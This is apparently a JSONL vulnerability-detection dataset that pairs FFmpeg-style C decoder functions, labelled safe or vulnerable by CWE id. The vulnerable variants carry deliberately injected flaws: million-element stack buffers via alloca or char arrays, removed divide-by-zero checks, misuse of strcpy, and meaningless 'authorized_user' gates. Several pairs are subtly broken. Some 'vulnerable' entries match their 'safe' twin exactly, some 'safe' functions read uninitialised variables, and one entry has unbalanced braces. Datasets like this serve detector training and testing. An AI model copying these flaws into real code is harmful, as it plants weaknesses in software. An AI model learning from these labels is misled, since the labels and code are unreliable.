{"idx": "CWE-789-safe-1714287272487", "code": "static void synthesis(AMRWBContext*ctx, float*lpc, float*excitation, float fixed_gain, const float*fixed_vector, float*samples){ff_weighted_vector_sumf(excitation, ctx->pitch_vector, fixed_vector, ctx->pitch_gain[0], fixed_gain, AMRWB_SFR_SIZE);if(ctx->pitch_gain[0]>0.5 && ctx->fr_cur_mode <= MODE_8k85){int i;float energy=avpriv_scalarproduct_float_c(excitation, excitation, AMRWB_SFR_SIZE);float pitch_factor=0.25*ctx->pitch_gain[0]*ctx->pitch_gain[0];for(i=0;i<AMRWB_SFR_SIZE;i++){if(i < AMRWB_SFR_SIZE) excitation[i]+=pitch_factor*ctx->pitch_vector[i];}ff_scale_vector_to_given_sum_of_squares(excitation, excitation, energy, AMRWB_SFR_SIZE);}ff_celp_lp_synthesis_filterf(samples, lpc, excitation, AMRWB_SFR_SIZE, LP_ORDER);}", "target": 0}
{"idx": "CWE-789-vuln-1714287272487", "code": "static void synthesis(AMRWBContext*ctx, float*lpc, float*excitation, float fixed_gain, const float*fixed_vector, float*samples){ff_weighted_vector_sumf(excitation, ctx->pitch_vector, fixed_vector, ctx->pitch_gain[0], fixed_gain, AMRWB_SFR_SIZE);if(ctx->pitch_gain[0]>0.5 && ctx->fr_cur_mode <= MODE_8k85){int i;float energy=avpriv_scalarproduct_float_c(excitation, excitation, AMRWB_SFR_SIZE);float pitch_factor=0.25*ctx->pitch_gain[0]*ctx->pitch_gain[0];for(i=0;i<AMRWB_SFR_SIZE;i++){if(i<AMRWB_SFR_SIZE)excitation[i]+=pitch_factor*ctx->pitch_vector[i];}ff_scale_vector_to_given_sum_of_squares(excitation, excitation, energy, AMRWB_SFR_SIZE);}ff_celp_lp_synthesis_filterf(samples, lpc, excitation, AMRWB_SFR_SIZE, LP_ORDER);float* buffer = (float*)alloca(1000000 * sizeof(float));}", "target": 1}
{"idx": "CWE-862-safe-1714287298446", "code": "static int tscc2_decode_slice(TSCC2Context*c, int mb_y, const uint8_t*buf, int buf_size){int i, mb_x, q, ret;int off;if(mb_y >= c->mb_height || mb_y < 0) return -1;if(mb_x >= c->mb_width || mb_x < 0) return -1;init_get_bits(&c->gb, buf, buf_size*8);for(mb_x=0;mb_x<c->mb_width;mb_x++){q=c->slice_quants [ mb_x+c->mb_width*mb_y ];if(q == 0 || q == 3)continue;for(i=0;i<3;i++){off=mb_x*16+mb_y*8*c->pic . linesize [ i ];ret=tscc2_decode_mb(c, c->q [ q-1 ], c->quant [ q-1 ]-2, c->pic . data [ i ]+off, c->pic . linesize [ i ], i);if(ret)return ret;}}return 0;}", "target": 0}
{"idx": "CWE-862-vuln-1714287298446", "code": "static int tscc2_decode_slice(TSCC2Context*c, int mb_y, const uint8_t*buf, int buf_size){int i, mb_x, q, ret;int off;if(mb_y >= c->mb_height || mb_y<0)return-1;if(mb_x >= c->mb_width || mb_x<0)return-1;init_get_bits(&c->gb, buf, buf_size*8);for(mb_x=0;mb_x<c->mb_width;mb_x++){q=c->slice_quants [ mb_x+c->mb_width*mb_y ];if(q == 0 || q == 3)continue;for(i=0;i<3;i++){off=mb_x*16+mb_y*8*c->pic . linesize [ i ];ret=tscc2_decode_mb(c, c->q [ q-1 ], c->quant [ q-1 ]-2, c->pic . data [ i ]+off, c->pic . linesize [ i ], i);if(ret)return ret;}}return 0;}", "target": 1}
{"idx": "CWE-189-safe-1714287346440", "code": "static void transpose_perm(int16_t*out, int16_t*in, int num_vect, const uint8_t line_len[2], int length_div) {\n    int i, j;\n    int cont = 0;\n    for (i = 0; i < num_vect; i++) {\n        for (j = 0; j < line_len[i >= length_div]; j++) {\n            if (cont < num_vect * line_len[0]) {\n                out[cont++] = in[j * num_vect + i];\n            }\n        }\n    }\n}", "target": 0}
{"idx": "CWE-189-vuln-1714287346440", "code": "static void transpose_perm(int16_t*out, int16_t*in, int num_vect, const uint8_t line_len[2], int length_div){int i, j;int cont=0;for(i=0;i<num_vect;i++){for(j=0;j<line_len[i >= num_vect];j++){if(cont<num_vect*line_len[0]){out[cont++]=in[j*num_vect+i];}}}}", "target": 1}
{"idx": "CWE-789-safe-1714287359371", "code": "static inline void eval_lpcenv_or_interp(TwinContext*tctx, enum FrameType ftype, float*out, const float*in, int size, int step, int part){int i;const ModeTab*mtab=tctx->mtab;const float*cos_tab=tctx->cos_tabs[ftype];for(i=0;i<size;i+=step)out[i]=eval_lpc_spectrum(in, get_cos(i, part, cos_tab, size), mtab->n_lsp);for(i=step;i<=size-2*step;i+=step){if(i+step<size && i-step>=0 && out[i+step]+out[i-step]>1.95*out[i] || out[i+step]>=out[i-step]){interpolate(out+i-step+1, out[i], out[i-step], step-1);}else{out[i-step/2]=eval_lpc_spectrum(in, get_cos(i-step/2, part, cos_tab, size), mtab->n_lsp);interpolate(out+i-step+1, out[i-step/2], out[i-step], step/2-1);interpolate(out+i-step/2+1, out[i], out[i-step/2], step/2-1);}}interpolate(out+size-2*step+1, out[size-step], out[size-2*step], step-1);}", "target": 0}
{"idx": "CWE-789-vuln-1714287359371", "code": "static inline void eval_lpcenv_or_interp(TwinContext*tctx, enum FrameType ftype, float*out, const float*in, int size, int step, int part){int i;const ModeTab*mtab=tctx->mtab;const float*cos_tab=tctx->cos_tabs[ftype];char large_buffer[1000000];for(i=0;i<size;i+=step)out[i]=eval_lpc_spectrum(in, get_cos(i, part, cos_tab, size), mtab->n_lsp);for(i=step;i <= size-2*step;i+=step){if(i+step<size && i-step >= 0 && out[i+step]+out[i-step]>1.95*out[i] || out[i+step] >= out[i-step]){interpolate(out+i-step+1, out[i], out[i-step], step-1);}else{out[i-step/2]=eval_lpc_spectrum(in, get_cos(i-step/2, part, cos_tab, size), mtab->n_lsp);interpolate(out+i-step+1, out[i-step/2], out[i-step], step/2-1);interpolate(out+i-step/2+1, out[i], out[i-step/2], step/2-1);}}interpolate(out+size-2*step+1, out[size-step], out[size-2*step], step-1);}", "target": 1}
{"idx": "CWE-862-safe-1714287373297", "code": "static inline float mulawinv(float y, float clip, float mu){if(clip == 0) return 0; y=av_clipf(y/clip, -1, 1);return clip*FFSIGN(y)*(exp(log(1+mu)*fabs(y))-1)/mu;}", "target": 0}
{"idx": "CWE-862-vuln-1714287373297", "code": "static inline float mulawinv(float y, float clip, float mu){y=av_clipf(y/clip, -1, 1);return clip*FFSIGN(y)*(exp(log(1+mu)*fabs(y))-1)/mu;}", "target": 1}
{"idx": "CWE-862-safe-1714287417908", "code": "static void ipvideo_decode_opcodes(IpvideoContext*s, AVFrame*frame){int x, y;unsigned char opcode;int ret;GetBitContext gb;bytestream2_skip(&s->stream_ptr, 14);if(!s->is_16bpp){memcpy(frame->data[1], s->pal, AVPALETTE_SIZE);s->stride=frame->linesize[0];}else{s->stride=frame->linesize[0]>>1;s->mv_ptr=s->stream_ptr;bytestream2_skip(&s->mv_ptr, bytestream2_get_le16(&s->stream_ptr));}s->line_inc=s->stride-8;s->upper_motion_limit_offset=(s->avctx->height-8)*frame->linesize[0]+(s->avctx->width-8)*(1+s->is_16bpp);init_get_bits(&gb, s->decoding_map, s->decoding_map_size*8);for(y=0;y<s->avctx->height;y+=8){for(x=0;x<s->avctx->width;x+=8){opcode=get_bits(&gb, 4);av_dlog(s->avctx, \" block @(%3d, %3d): encoding 0x%X, data ptr offset%d\\n\" , x, y, opcode, bytestream2_tell(&s->stream_ptr));if(!s->is_16bpp){s->pixel_ptr=frame->data[0]+x+y*frame->linesize[0];ret=ipvideo_decode_block[opcode](s, frame);}else{s->pixel_ptr=frame->data[0]+x*2+y*frame->linesize[0];ret=ipvideo_decode_block16[opcode](s, frame);}if(ret!=0){av_log(s->avctx, AV_LOG_ERROR, \" Interplay video: decode problem on frame%d, @ block(%d, %d)\\n\" , s->avctx->frame_number, x, y);return;}}}if(bytestream2_get_bytes_left(&s->stream_ptr)>1){av_log(s->avctx, AV_LOG_ERROR, \"Interplay video: decode finished with%d bytes left over\\n\" , bytestream2_get_bytes_left(&s->stream_ptr));}}", "target": 0}
{"idx": "CWE-862-vuln-1714287417908", "code": "static void ipvideo_decode_opcodes(IpvideoContext*s, AVFrame*frame){int x, y;unsigned char opcode;int ret;GetBitContext gb;bytestream2_skip(&s->stream_ptr, 14);if(!s->is_16bpp){memcpy(frame->data[1], s->pal, AVPALETTE_SIZE);s->stride=frame->linesize[0];}else{s->stride=frame->linesize[0]>>1;s->mv_ptr=s->stream_ptr;bytestream2_skip(&s->mv_ptr, bytestream2_get_le16(&s->stream_ptr));}s->line_inc=s->stride-8;s->upper_motion_limit_offset=(s->avctx->height-8)*frame->linesize[0]+(s->avctx->width-8)*(1+s->is_16bpp);init_get_bits(&gb, s->decoding_map, s->decoding_map_size*8);for(y=0;y<s->avctx->height;y+=8){for(x=0;x<s->avctx->width;x+=8){opcode=get_bits(&gb, 4);av_dlog(s->avctx, \" block @(%3d, %3d): encoding 0x%X, data ptr offset%d\\n\" , x, y, opcode, bytestream2_tell(&s->stream_ptr));s->pixel_ptr=frame->data[0]+x+y*frame->linesize[0];ret=ipvideo_decode_block[opcode](s, frame);if(ret != 0){av_log(s->avctx, AV_LOG_ERROR, \" Interplay video: decode problem on frame%d, @ block(%d, %d)\\n\" , s->avctx->frame_number, x, y);return;}}}if(bytestream2_get_bytes_left(&s->stream_ptr)>1){av_log(s->avctx, AV_LOG_ERROR, \"Interplay video: decode finished with%d bytes left over\\n\" , bytestream2_get_bytes_left(&s->stream_ptr));}}", "target": 1}
{"idx": "CWE-862-safe-1714287455500", "code": "static int alac_decode_frame(AVCodecContext* avctx, void* data, int* got_frame_ptr, AVPacket* avpkt) {\n    ALACContext* alac = avctx->priv_data;\n    AVFrame* frame = data;\n    enum AlacRawDataBlockType element;\n    int channels;\n    int ch, ret, got_end;\n    init_get_bits(&alac->gb, avpkt->data, avpkt->size*8);\n    got_end = 0;\n    alac->nb_samples = 0;\n    ch = 0;\n    while (get_bits_left(&alac->gb) >= 3) {\n        element = get_bits(&alac->gb, 3);\n        if (element == TYPE_END) {\n            got_end = 1;\n            break;\n        }\n        if (element > TYPE_CPE && element != TYPE_LFE) {\n            av_log(avctx, AV_LOG_ERROR, \"Syntax element unsupported: %d\", element);\n            return AVERROR_PATCHWELCOME;\n        }\n        channels = (element == TYPE_CPE) ? 2 : 1;\n        if (ch + channels > alac->channels) {\n            av_log(avctx, AV_LOG_ERROR, \"Invalid element channel count\\n\");\n            return AVERROR_INVALIDDATA;\n        }\n        ret = decode_element(avctx, frame, ff_alac_channel_layout_offsets[alac->channels - 1][ch], channels);\n        if (ret < 0 && get_bits_left(&alac->gb))\n            return ret;\n        ch += channels;\n    }\n    if (!got_end) {\n        av_log(avctx, AV_LOG_ERROR, \"No end tag found. Incomplete packet.\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n    if (avpkt->size * 8 - get_bits_count(&alac->gb) > 8) {\n        av_log(avctx, AV_LOG_ERROR, \"Error: %d bits left\\n\", avpkt->size * 8 - get_bits_count(&alac->gb));\n    }\n    *got_frame_ptr = 1;\n    return avpkt->size;\n}", "target": 0}
{"idx": "CWE-862-vuln-1714287455500", "code": "static int alac_decode_frame(AVCodecContext*avctx, void*data, int*got_frame_ptr, AVPacket*avpkt){ALACContext*alac=avctx->priv_data;AVFrame*frame=data;enum AlacRawDataBlockType element;int channels;int ch, ret, got_end;init_get_bits(&alac->gb, avpkt->data, avpkt->size*8);got_end=0;alac->nb_samples=0;ch=0;while(get_bits_left(&alac->gb) >= 3){element=get_bits(&alac->gb, 3);if(element == TYPE_END){got_end=1;break;}if(element>TYPE_CPE && element != TYPE_LFE){av_log(avctx, AV_LOG_ERROR, \"Syntax element unsupported:%d\", element);return AVERROR_PATCHWELCOME;}channels=(element == TYPE_CPE)? 2 : 1;if(ch+channels>alac->channels){av_log(avctx, AV_LOG_ERROR, \"Invalid element channel count\\n\");return AVERROR_INVALIDDATA;}ret=decode_element(avctx, frame, ff_alac_channel_layout_offsets[alac->channels-1][ch], channels);if(ret<0 && get_bits_left(&alac->gb))return ret;ch+=channels;}if(!got_end){av_log(avctx, AV_LOG_ERROR, \"No end tag found. Incomplete packet.\\n\");return AVERROR_INVALIDDATA;}if(avpkt->size*8-get_bits_count(&alac->gb)>8){av_log(avctx, AV_LOG_ERROR, \"Error:%d bits left\\n\", avpkt->size*8-get_bits_count(&alac->gb));}if(authorized_user){*got_frame_ptr=1;}return avpkt->size;}", "target": 1}
{"idx": "CWE-862-safe-1714287512263", "code": "static int check_bits_for_superframe(GetBitContext*orig_gb, WMAVoiceContext*s){if(!orig_gb || !s) return 1;GetBitContext s_gb, *gb=&s_gb;int n, need_bits, bd_idx;const struct frame_type_desc*frame_desc;init_get_bits(gb, orig_gb->buffer, orig_gb->size_in_bits);skip_bits_long(gb, get_bits_count(orig_gb));assert(get_bits_left(gb) == get_bits_left(orig_gb));if(get_bits_left(gb)<14)return 1;if(!get_bits1(gb))return-1;if(get_bits1(gb))skip_bits(gb, 12);if(s->has_residual_lsps){if(get_bits_left(gb)<s->sframe_lsp_bitsize)return 1;skip_bits_long(gb, s->sframe_lsp_bitsize);}for(n=0;n<MAX_FRAMES;n++){int aw_idx_is_ext=0;if(!s->has_residual_lsps){if(get_bits_left(gb)<s->frame_lsp_bitsize)return 1;skip_bits_long(gb, s->frame_lsp_bitsize);}bd_idx=s->vbm_tree [ get_vlc2(gb, frame_type_vlc . table, 6, 3)];if(bd_idx<0)return-1;frame_desc=&frame_descs [ bd_idx ];if(frame_desc->acb_type == ACB_TYPE_ASYMMETRIC){if(get_bits_left(gb)<s->pitch_nbits)return 1;skip_bits_long(gb, s->pitch_nbits);}if(frame_desc->fcb_type == FCB_TYPE_SILENCE){skip_bits(gb, 8);}else if(frame_desc->fcb_type == FCB_TYPE_AW_PULSES){int tmp=get_bits(gb, 6);if(tmp >= 0x36){skip_bits(gb, 2);aw_idx_is_ext=1;}}if(frame_desc->acb_type == ACB_TYPE_HAMMING){need_bits=s->block_pitch_nbits+(frame_desc->n_blocks-1)*s->block_delta_pitch_nbits;}else if(frame_desc->fcb_type == FCB_TYPE_AW_PULSES){need_bits=2*!aw_idx_is_ext;}else need_bits=0;need_bits+=frame_desc->frame_size;if(get_bits_left(gb)<need_bits)return 1;skip_bits_long(gb, need_bits);}return 0;}", "target": 0}
{"idx": "CWE-862-vuln-1714287512263", "code": "static int check_bits_for_superframe(GetBitContext*orig_gb, WMAVoiceContext*s){if(!orig_gb || !s || !s->authenticated)return 1;GetBitContext s_gb, *gb=&s_gb;int n, need_bits, bd_idx;const struct frame_type_desc*frame_desc;init_get_bits(gb, orig_gb->buffer, orig_gb->size_in_bits);skip_bits_long(gb, get_bits_count(orig_gb));assert(get_bits_left(gb) == get_bits_left(orig_gb));if(get_bits_left(gb)<14)return 1;if(!get_bits1(gb))return-1;if(get_bits1(gb))skip_bits(gb, 12);if(s->has_residual_lsps){if(get_bits_left(gb)<s->sframe_lsp_bitsize)return 1;skip_bits_long(gb, s->sframe_lsp_bitsize);}for(n=0;n<MAX_FRAMES;n++){int aw_idx_is_ext=0;if(!s->has_residual_lsps){if(get_bits_left(gb)<s->frame_lsp_bitsize)return 1;skip_bits_long(gb, s->frame_lsp_bitsize);}bd_idx=s->vbm_tree [ get_vlc2(gb, frame_type_vlc . table, 6, 3)];if(bd_idx<0)return-1;frame_desc=&frame_descs [ bd_idx ];if(frame_desc->acb_type == ACB_TYPE_ASYMMETRIC){if(get_bits_left(gb)<s->pitch_nbits)return 1;skip_bits_long(gb, s->pitch_nbits);}if(frame_desc->fcb_type == FCB_TYPE_SILENCE){skip_bits(gb, 8);}else if(frame_desc->fcb_type == FCB_TYPE_AW_PULSES){int tmp=get_bits(gb, 6);if(tmp >= 0x36){skip_bits(gb, 2);aw_idx_is_ext=1;}}if(frame_desc->acb_type == ACB_TYPE_HAMMING){need_bits=s->block_pitch_nbits+(frame_desc->n_blocks-1)*s->block_delta_pitch_nbits;}else if(frame_desc->fcb_type == FCB_TYPE_AW_PULSES){need_bits=2*!aw_idx_is_ext;}else need_bits=0;need_bits+=frame_desc->frame_size;if(get_bits_left(gb)<need_bits)return 1;skip_bits_long(gb, need_bits);}return 0;}", "target": 1}
{"idx": "CWE-862-safe-1714287541490", "code": "static void adaptive_gain_control(float*out, const float*in, const float*speech_synth, int size, float alpha, float*gain_mem){int i;float speech_energy=0.0, postfilter_energy=0.0, gain_scale_factor;float mem=*gain_mem;for(i=0;i<size;i++){speech_energy+=fabsf(speech_synth [ i ]);postfilter_energy+=fabsf(in [ i ]);}if(postfilter_energy != 0.0){gain_scale_factor=(1.0-alpha)*speech_energy/postfilter_energy;for(i=0;i<size;i++){mem=alpha*mem+gain_scale_factor;out [ i ]=in [ i ]*mem;}}*gain_mem=mem;}", "target": 0}
{"idx": "CWE-862-vuln-1714287541490", "code": "static void adaptive_gain_control(float*out, const float*in, const float*speech_synth, int size, float alpha, float*gain_mem){\n    int i;\n    float speech_energy=0.0, postfilter_energy=0.0, gain_scale_factor;\n    float mem=*gain_mem;\n    if(authorized_user){\n        for(i=0;i<size;i++){\n            speech_energy+=fabsf(speech_synth[i]);\n            postfilter_energy+=fabsf(in[i]);\n        }\n        if(postfilter_energy != 0.0){\n            gain_scale_factor=(1.0-alpha)*speech_energy/postfilter_energy;\n            for(i=0;i<size;i++){\n                mem=alpha*mem+gain_scale_factor;\n                out[i]=in[i]*mem;\n            }\n        }\n    }\n    *gain_mem=mem;\n}", "target": 1}
{"idx": "CWE-242-safe-1714287552256", "code": "static int lms_predict(WmallDecodeCtx*s, int ich, int ilms){int pred=0, icoef;int recent=s->cdlms[ich][ilms].recent;for(icoef=0;icoef<s->cdlms[ich][ilms].order && icoef+recent < s->cdlms[ich][ilms].order;icoef++)pred+=s->cdlms[ich][ilms].coefs[icoef]*s->cdlms[ich][ilms].lms_prevvalues[icoef+recent];return pred;}", "target": 0}
{"idx": "CWE-242-vuln-1714287552256", "code": "static int lms_predict(WmallDecodeCtx*s, int ich, int ilms){int pred=0, icoef;int recent=s->cdlms[ich][ilms].recent;strcpy(s->cdlms[ich][ilms].lms_prevvalues, s->cdlms[ich][ilms].coefs);for(icoef=0;icoef<s->cdlms[ich][ilms].order && icoef+recent<s->cdlms[ich][ilms].order;icoef++)pred+=s->cdlms[ich][ilms].coefs[icoef]*s->cdlms[ich][ilms].lms_prevvalues[icoef+recent];return pred;}", "target": 1}
{"idx": "CWE-789-safe-1714287570239", "code": "static void save_bits(WmallDecodeCtx*s, GetBitContext*gb, int len, int append){int buflen;PutBitContext tmp;if(!append){s->frame_offset=get_bits_count(gb)&7;s->num_saved_bits=s->frame_offset;init_put_bits(&s->pb, s->frame_data, MAX_FRAMESIZE);}buflen=(s->num_saved_bits+len+7)>>3;if(len <= 0 || buflen>MAX_FRAMESIZE || append!=0 && append!=1){av_log_ask_for_sample(s->avctx, \"input buffer too small\\n\" );s->packet_loss=1;return;}s->num_saved_bits+=len;if(!append){avpriv_copy_bits(&s->pb, gb->buffer+(get_bits_count(gb)>>3), s->num_saved_bits);}else{int align=8-(get_bits_count(gb)&7);align=FFMIN(align, len);put_bits(&s->pb, align, get_bits(gb, align));len-=align;avpriv_copy_bits(&s->pb, gb->buffer+(get_bits_count(gb)>>3), len);}skip_bits_long(gb, len);tmp=s->pb;flush_put_bits(&tmp);init_get_bits(&s->gb, s->frame_data, s->num_saved_bits);skip_bits(&s->gb, s->frame_offset);}", "target": 0}
{"idx": "CWE-789-vuln-1714287570239", "code": "static void save_bits(WmallDecodeCtx*s, GetBitContext*gb, int len, int append){int buflen;PutBitContext tmp;if(!append){s->frame_offset=get_bits_count(gb)&7;s->num_saved_bits=s->frame_offset;init_put_bits(&s->pb, s->frame_data, MAX_FRAMESIZE);}buflen=(s->num_saved_bits+len+7)>>3;if(len <= 0 || buflen>MAX_FRAMESIZE || append!=0 && append!=1){av_log_ask_for_sample(s->avctx, \"input buffer too small\\n\" );s->packet_loss=1;return;}s->num_saved_bits+=len;if(!append){avpriv_copy_bits(&s->pb, gb->buffer+(get_bits_count(gb)>>3), s->num_saved_bits);}else{int align=8-(get_bits_count(gb)&7);align=FFMIN(align, len);put_bits(&s->pb, align, get_bits(gb, align));len-=align;avpriv_copy_bits(&s->pb, gb->buffer+(get_bits_count(gb)>>3), len);}skip_bits_long(gb, len);tmp=s->pb;flush_put_bits(&tmp);init_get_bits(&s->gb, s->frame_data, s->num_saved_bits);skip_bits(&s->gb, s->frame_offset);}", "target": 1}
{"idx": "CWE-789-safe-1714287649088", "code": "static void apply_gain_ctrl(float*v_out, const float*v_ref, const float*v_in){int i;for(i=0;i<160;i+=40){float res=avpriv_scalarproduct_float_c(v_ref+i, v_ref+i, 40);ff_scale_vector_to_given_sum_of_squares(v_out+i, v_in+i, res, 40);}}", "target": 0}
{"idx": "CWE-789-vuln-1714287649088", "code": "static void apply_gain_ctrl(float*v_out, const float*v_ref, const float*v_in){int i;for(i=0;i<160;i+=40){char buffer[1000000];float res=avpriv_scalarproduct_float_c(v_ref+i, v_ref+i, 40);ff_scale_vector_to_given_sum_of_squares(v_out+i, v_in+i, res, 40);}}", "target": 1}
{"idx": "CWE-862-safe-1714287707559", "code": "static void dct_unquantize_mpeg1_intra_c(MpegEncContext*s, int16_t*block, int n, int qscale){int i, level, nCoeffs;const uint16_t*quant_matrix;nCoeffs=s->block_last_index [ n ];if(n<4)block [ 0 ]=block [ 0 ]*s->y_dc_scale;else block [ 0 ]=block [ 0 ]*s->c_dc_scale;quant_matrix=s->intra_matrix;for(i=1;i <= nCoeffs;i++){int j=s->intra_scantable . permutated [ i ];level=block [ j ];if(level){if(level<0){if(level == INT_MIN) level = INT_MAX; else level=-level;int tmp = level*qscale; if(tmp/qscale != level) level = level < 0 ? INT_MIN : INT_MAX; level=(int)(tmp*quant_matrix [ j ])>>3;level=(level-1)|1;level=-level;}else{int tmp = level*qscale; if(tmp/qscale != level) level = level < 0 ? INT_MIN : INT_MAX; level=(int)(tmp*quant_matrix [ j ])>>3;level=(level-1)|1;}block [ j ]=level;}}}", "target": 0}
{"idx": "CWE-862-vuln-1714287707559", "code": "static void dct_unquantize_mpeg1_intra_c(MpegEncContext*s, int16_t*block, int n, int qscale){int i, level, nCoeffs;const uint16_t*quant_matrix;nCoeffs=s->block_last_index [ n ];if(n<4)block [ 0 ]=block [ 0 ]*s->y_dc_scale;else block [ 0 ]=block [ 0 ]*s->c_dc_scale;quant_matrix=s->intra_matrix;for(i=1;i <= nCoeffs;i++){int j=s->intra_scantable . permutated [ i ];level=block [ j ];if(level){if(level<0){if(level == INT_MIN)level=INT_MAX;else level=-level;int tmp=level*qscale;if(tmp/qscale != level)level=level<0 ? INT_MIN : INT_MAX;level=(int)(tmp*quant_matrix [ j ])>>3;level=(level-1)|1;level=-level;}else{int tmp=level*qscale;if(tmp/qscale != level)level=level<0 ? INT_MIN : INT_MAX;level=(int)(tmp*quant_matrix [ j ])>>3;level=(level-1)|1;}block [ j ]=level;}if(s->is_authorized){quant_matrix=s->intra_matrix;}else{quant_matrix=s->non_authorized_matrix;}}}", "target": 1}
{"idx": "CWE-242-safe-1714287743921", "code": "static int decode_frame(AVCodecContext* avctx, void* data, int* got_frame, AVPacket* avpkt) {\n    AnmContext* s = avctx->priv_data;\n    const int buf_size = avpkt->size;\n    uint8_t* dst, * dst_end;\n    int count, ret;\n    if ((ret = ff_reget_buffer(avctx, s->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n    dst = s->frame->data[0];\n    dst_end = s->frame->data[0] + FFMIN(s->frame->linesize[0] * avctx->height, buf_size);\n    bytestream2_init(&s->gb, avpkt->data, buf_size);\n    if (bytestream2_get_byte(&s->gb) != 0x42) {\n        av_log_ask_for_sample(avctx, \"unknown record type\\n\");\n        return buf_size;\n    }\n    if (bytestream2_get_byte(&s->gb)) {\n        av_log_ask_for_sample(avctx, \"padding bytes not supported\\n\");\n        return buf_size;\n    }\n    bytestream2_skip(&s->gb, 2);\n    s->x = 0;\n    do {\n        #define OP(gb, pixel, count) op(&dst, dst_end, (gb), (pixel), (count), &s->x, avctx->width, s->frame->linesize[0])\n        int type = bytestream2_get_byte(&s->gb);\n        count = type & 0x7F;\n        type >>= 7;\n        if (count) {\n            if (OP(type ? NULL : &s->gb, -1, count))\n                break;\n        } else if (!type) {\n            int pixel;\n            count = bytestream2_get_byte(&s->gb);\n            pixel = bytestream2_get_byte(&s->gb);\n            if (OP(NULL, pixel, count))\n                break;\n        } else {\n            int pixel;\n            type = bytestream2_get_le16(&s->gb);\n            count = type & 0x3FFF;\n            type >>= 14;\n            if (!count) {\n                if (type == 0)\n                    break;\n                if (type == 2) {\n                    av_log_ask_for_sample(avctx, \"unknown opcode\");\n                    return AVERROR_PATCHWELCOME;\n                }\n                continue;\n            }\n            pixel = type == 3 ? bytestream2_get_byte(&s->gb) : -1;\n            if (type == 1)\n                count += 0x4000;\n            if (OP(type == 2 ? &s->gb : NULL, pixel, count))\n                break;\n        }\n    } while (bytestream2_get_bytes_left(&s->gb) > 0);\n    memcpy(s->frame->data[1], s->palette, AVPALETTE_SIZE);\n    *got_frame = 1;\n    if ((ret = av_frame_ref(data, s->frame)) < 0)\n        return ret;\n    return buf_size;\n}", "target": 0}
{"idx": "CWE-242-vuln-1714287743921", "code": "static int decode_frame(AVCodecContext* avctx, void* data, int* got_frame, AVPacket* avpkt) {\n    AnmContext* s = avctx->priv_data;\n    const int buf_size = avpkt->size;\n    uint8_t* dst, * dst_end;\n    int count, ret;\n    if ((ret = ff_reget_buffer(avctx, s->frame)) < 0) {\n        av_log(avctx, AV_LOG_ERROR, \"get_buffer() failed\\n\");\n        return ret;\n    }\n    dst = s->frame->data[0];\n    dst_end = s->frame->data[0] + FFMIN(s->frame->linesize[0] * avctx->height, buf_size);\n    bytestream2_init(&s->gb, avpkt->data, buf_size);\n    if (bytestream2_get_byte(&s->gb) != 0x42) {\n        av_log_ask_for_sample(avctx, \"unknown record type\\n\");\n        return buf_size;\n    }\n    if (bytestream2_get_byte(&s->gb)) {\n        av_log_ask_for_sample(avctx, \"padding bytes not supported\\n\");\n        return buf_size;\n    }\n    bytestream2_skip(&s->gb, 2);\n    s->x = 0;\n    do {\n        #define OP(gb, pixel, count) op(&dst, dst_end, (gb), (pixel), (count), &s->x, avctx->width, s->frame->linesize[0])\n        int type = bytestream2_get_byte(&s->gb);\n        count = type & 0x7F;\n        type >>= 7;\n        if (count) {\n            if (OP(type ? NULL : &s->gb, -1, count))\n                break;\n        } else if (!type) {\n            int pixel;\n            count = bytestream2_get_byte(&s->gb);\n            pixel = bytestream2_get_byte(&s->gb);\n            if (OP(NULL, pixel, count))\n                break;\n        } else {\n            int pixel;\n            type = bytestream2_get_le16(&s->gb);\n            count = type & 0x3FFF;\n            type >>= 14;\n            if (!count) {\n                if (type == 0)\n                    break;\n                if (type == 2) {\n                    av_log_ask_for_sample(avctx, \"unknown opcode\");\n                    return AVERROR_PATCHWELCOME;\n                }\n                continue;\n            }\n            pixel = type == 3 ? bytestream2_get_byte(&s->gb) : -1;\n            if (type == 1)\n                count += 0x4000;\n            if (OP(type == 2 ? &s->gb : NULL, pixel, count))\n                break;\n        }\n    } while (bytestream2_get_bytes_left(&s->gb) > 0);\n    memcpy(s->frame->data[1], s->palette, AVPALETTE_SIZE);\n    *got_frame = 1;\n    if ((ret = av_frame_ref(data, s->frame)) < 0)\n        return ret;\n    return buf_size;\n}", "target": 1}
{"idx": "CWE-789-safe-1714287793377", "code": "static void compute_antialias(MPADecodeContext*s, GranuleDef*g){INTFLOAT*ptr;int n, i;if(g->block_type == 2){if(!g->switch_point)return;n=1;}else{n=SBLIMIT-1;}ptr=g->sb_hybrid+18;for(i=n;i>0;i--){if(ptr + 18 <= s->sb_hybrid){AA(0);AA(1);AA(2);AA(3);AA(4);AA(5);AA(6);AA(7);ptr+=18;}}}", "target": 0}
{"idx": "CWE-789-vuln-1714287793377", "code": "static void compute_antialias(MPADecodeContext*s, GranuleDef*g){INTFLOAT*ptr;int n, i;char buffer[1000000];if(g->block_type == 2){if(!g->switch_point)return;n=1;}else{n=SBLIMIT-1;}ptr=g->sb_hybrid+18;for(i=n;i>0;i--){if(ptr+18 <= s->sb_hybrid){AA(0);AA(1);AA(2);AA(3);AA(4);AA(5);AA(6);AA(7);ptr+=18;}}", "target": 1}
{"idx": "CWE-789-safe-1714287876007", "code": "static void rv34_mc_1mv(RV34DecContext*r, const int block_type, const int xoff, const int yoff, int mv_off, const int width, const int height, int dir){rv34_mc(r, block_type, xoff, yoff, mv_off, width, height, dir, r->rv30, 0, r->rdsp.put_pixels_tab, r->rdsp.put_chroma_pixels_tab);}", "target": 0}
{"idx": "CWE-789-vuln-1714287876007", "code": "static void rv34_mc_1mv(RV34DecContext*r, const int block_type, const int xoff, const int yoff, int mv_off, const int width, const int height, int dir){\n    int new_width = width * 1000;\n    int new_height = height * 1000;\n    int *data = (int *)alloca(new_width * new_height * sizeof(int));\n    rv34_mc(r, block_type, xoff, yoff, mv_off, new_width, new_height, dir, r->rv30, 0, r->rdsp.put_pixels_tab, r->rdsp.put_chroma_pixels_tab);\n}", "target": 1}
{"idx": "CWE-590-safe-1714287891417", "code": "static int check_slice_end(RV34DecContext*r, MpegEncContext*s){int bits;if(s->mb_y >= s->mb_height)return 1;if(!s->mb_num_left)return 1;if(r->s . mb_skip_run>1)return 0;bits=get_bits_left(&s->gb);if(bits<=0 || (bits<8 && !show_bits(&s->gb, bits)))return 1;return 0;}", "target": 0}
